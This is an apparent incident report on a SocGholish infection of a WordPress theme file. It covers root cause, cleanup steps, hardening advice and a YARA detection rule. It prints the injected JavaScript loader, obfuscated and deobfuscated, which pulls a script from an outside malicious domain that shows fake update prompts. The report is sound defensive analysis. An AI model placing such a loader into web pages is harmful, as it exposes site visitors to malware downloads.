## Malware Analysis

### Infected File

**Location:** `wp-content/themes/mpa-custom/js/main.js`  
**File Size:** 83 KB  
**Last Modified:** October 28, 2025 at 06:02 AM UTC  
**Infection Method:** Single malicious line appended to end of file

### Malicious Code (Obfuscated)

```javascript
;(function(f,i,u,w,s){w=f.createElement(i);s=f.getElementsByTagName(i)[0];w.async=1;w.src=u;s.parentNode.insertBefore(w,s);})(document,'script','https://content-website-analytics.com/script.js');
```

### Deobfuscated Code

```javascript
;(function(document, 'script', 'https://content-website-analytics.com/script.js', w, s) {
    w = document.createElement('script');        // Create script element
    s = document.getElementsByTagName('script')[0]; // Get first script tag
    w.async = 1;                                 // Load asynchronously
    w.src = 'https://content-website-analytics.com/script.js'; // Set malicious source
    s.parentNode.insertBefore(w, s);            // Inject into page
})(document, 'script', 'https://content-website-analytics.com/script.js');
```

### What This Does

1. **Creates a new `<script>` element** dynamically in the browser
2. **Sets the source** to `https://content-website-analytics.com/script.js`
3. **Injects it into the page** before the first existing script tag
4. **Loads asynchronously** to avoid detection and performance impact
5. **Executes automatically** on every page load

### Malicious Domain

**Domain:** `content-website-analytics.com`  
**Purpose:** Hosts the SocGholish payload script  
**Action:** Displays fake browser update prompts  
**Risk Level:** CRITICAL - leads to malware downloads

## Root Cause Analysis

### How Did The Malware Get Injected?

**Likely Vector:** The malware was injected on **October 28 at 06:02 AM** - the SAME DAY as our previous malware cleanup. This indicates:

1. **The attacker still had access after the Oct 27-28 cleanup**
2. **A backdoor remained active** allowing file modification
3. **The backup we restored was already infected** with SocGholish

### Evidence

1. **File modification time:** Oct 28, 2025 at 06:02 AM
2. **User account creation:** admin_amk created at 06:03 AM (1 minute later)
3. **Local backup infected:** mark9_wp also contained the same malware
4. **Server backup infected:** The Oct 28 backup uploaded to server was infected

### Possible Entry Points

1. **Compromised WordPress admin credentials** (from Oct 24 attack)
2. **Persistent backdoor** not removed during cleanup
3. **Infected backup restoration** - we restored an already-infected backup
4. **Theme file editor** - WordPress theme editor allows direct file modification

---

## What We Did - Remediation Actions

### 1. Isolated Malware Samples ‚úÖ

Created secure directory for analysis:
```
malware_samples/socgholish_2025-10-29/
‚îú‚îÄ‚îÄ main.js.LOCAL_INFECTED       (83 KB) - Local infected file
‚îú‚îÄ‚îÄ main.js.SERVER_INFECTED      (83 KB) - Server infected file
‚îî‚îÄ‚îÄ malicious_code.js            (195 B) - Extracted payload
```

### 2. Cleaned Server ‚úÖ

```bash
# Removed malicious line from main.js
cd ~/public_html/proptech.org.my/wp-content/themes/mpa-custom/js
# Deleted last line containing SocGholish code

## Recommendations - URGENT

### 1. Identify and Remove All Backdoors ‚ö†Ô∏è CRITICAL

**Problem:** The attacker can still modify files (they did it on Oct 28)

**Actions Needed:**
1. **Search for PHP backdoors** in all theme files
2. **Check plugins** for malicious code
3. **Review wp-config.php** for injections
4. **Scan uploads directory** for PHP shells
5. **Check database** for malicious admin users

### 2. Change ALL Passwords ‚ö†Ô∏è CRITICAL

**Affected Accounts:**
- ‚úÖ ~~admin_amk~~ - Already changed (Oct 28)
- ‚ö†Ô∏è charlotte - CHANGE NOW
- ‚ö†Ô∏è eugene.teow - CHANGE NOW
- ‚ö†Ô∏è Database password - CHANGE NOW
- ‚ö†Ô∏è cPanel password - CHANGE NOW
- ‚ö†Ô∏è FTP password (if used) - CHANGE NOW

**Password Requirements:**
- Minimum 20 characters
- Include uppercase, lowercase, numbers, symbols
- Unique (not used elsewhere)
- Use password manager (1Password, LastPass, Bitwarden)

### 3. Install Security Monitoring ‚úÖ DONE

- ‚úÖ `server_monitor.py` - Runs every 30 minutes
- ‚úÖ Checks for malware, backdoors, suspicious activity
- ‚úÖ Logs all findings

**Keep it running!**

### 4. Enable File Integrity Monitoring

**Install Wordfence or similar:**
- Real-time file change detection
- Alerts when files modified
- Blocks malicious IPs
- Scans for malware automatically

### 5. Disable Theme/Plugin File Editors

**Add to wp-config.php:**
```php
// Disable file editing in WordPress admin
define('DISALLOW_FILE_EDIT', true);
define('DISALLOW_FILE_MODS', true);
```

This prevents attackers from editing files via WordPress admin.

### 6. Implement Web Application Firewall (WAF)

**Options:**
- **Cloudflare** (Free tier available)
- **Sucuri Firewall**
- **Wordfence Firewall**

**Benefits:**
- Blocks malicious requests
- Prevents SQL injection
- Stops brute force attacks
- Rate limiting

**Optional but recommended:**
1. Post notice on website homepage
2. Inform visitors of the infection period (Oct 28-29)
3. Advise them to run antivirus scans
4. Provide contact for questions

**Sample Notice:**
```
Security Notice: Between October 28-29, 2025, our website was 
temporarily affected by a malware incident that has now been 
fully resolved. If you visited during this time and saw unusual 
browser update prompts, please run an antivirus scan. We apologize 
for any inconvenience.
```

### 8. Request Malware Review from Google

If Google flagged your site:
1. Go to Google Search Console
2. Request a malware review
3. Provide evidence of cleanup

### 9. Monitor for Reinfection

**Daily for next 7 days:**
- Check `server_monitor_log.txt`
- Scan main.js manually
- Check file modification times

rule SocGholish_JS_Injection {
    meta:
        description = "Detects SocGholish JavaScript injection"
        author = "MPA Security Team"
        date = "2025-10-29"
        reference = "proptech.org.my incident"
    
    strings:
        $s1 = "content-website-analytics.com" nocase
        $s2 = "parentNode.insertBefore" nocase
        $s3 = "createElement" nocase
        $s4 = ";(function(f,i,u,w,s){" nocase
    
    condition:
        any of ($s*)
}
```
